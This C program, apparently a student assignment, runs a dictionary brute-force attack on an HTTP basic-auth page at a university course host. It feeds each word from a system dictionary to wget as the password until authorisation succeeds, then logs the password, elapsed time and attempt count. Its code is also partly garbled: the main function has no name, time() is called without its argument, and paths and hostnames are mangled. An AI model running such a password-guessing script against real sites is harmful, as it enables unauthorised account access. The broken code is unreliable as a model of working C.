#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/time.h>



char* joinMe(char* t, char* t2)
{
	char* result;
	int length = 0;
	int j = 0;
	int counter = 0;
	
	length = strlen(t) + strlen(t2) + 1;
	
	result = malloc(sizeof(char) * length);
	
	
	for(j = 0; j<strlen(t); j++)
	{
		result[j] = t[j];
	}

	
	for(j = strlen(t); j<length; j++)
	{
		result[j] = t2[counter];
		counter++;
	}
	
	
	result[length-1] = '\0';

	return result;
}


void check(char** smallcmd)
{
	int pid = 0;
	int status;

	
	if( (pid = fork()) == 0)
	{
		
		execvp(smallcmd[0],smallcmd);
	}
	else
	{
		
		while(wait(&status) != pid);
	}
}

int (void)
{
	int i = 0, j = 0, k = 0;
	char** smallcmd;
	int count = 0;
	FILE *myFile,*myFile2,*myFile3;
	int compare1;
	char* myString;
	int length = 0;
	int start1, end1;
	
	
	myString = malloc(sizeof(char) * 100);
	smallcmd = malloc(sizeof(char *) * 8);
	
	smallcmd[0] = "/usr/local//wget";
	
	smallcmd[1] = "--http-user=";
	smallcmd[2] = "--http-passwd=";
	smallcmd[3] = "-o";
	smallcmd[4] = "logwget";
	smallcmd[5] = "-nv";
	smallcmd[6] = "http://sec-crack.cs.rmit.edu./SEC/2/";

	
	printf("-------------now trying Dictonary force attack---------------\n");
	start1 = time();
	myFile = fopen("/usr/share/lib/dict/words","r");
	if(myFile != (FILE*) NULL)
	{
		while( fgets(myString,100,myFile) != NULL)
		{
			
			
			
			smallcmd[2] = joinMe(smallcmd[2],myString);
			length = strlen(smallcmd[2]);
			
			smallcmd[2][length-1] = '\0';
			printf("Checking : %s\n",smallcmd[2]);
			
			check(smallcmd);
			count++;
			
			myFile2 = fopen("logwget", "r");
			if (myFile2 != (FILE*) NULL)
			{
				
				fgets(myString,100,myFile2);
				printf("%s\n",myString);
				if( strcmp(myString,"Authorization failed.\n") != 0)
				{
					
					printf("Passwd = %s\n\n",smallcmd[2]);
					end1= time();
					
					myFile3 = fopen("log.txt","a");
					fprintf(myFile3,"%s",smallcmd[2]);
					
					fputs("\nTime taken by Dictionary Attack ",myFile3);
					compare1 = ((end1-start1)/1000000000);
					fprintf(myFile3,"%lld",compare1);
					fputs(" seconds\n",myFile3);
					fputs("this took ",myFile3);
					fprintf(myFile3,"%d",count);
					fputs(" attempts\n\n",myFile3);
					fclose(myFile3);
				}
				fclose(myFile2);
			}
			
			smallcmd[2] = "--http-passwd=";
		}
	}
	fclose(myFile);
	return 1;
}

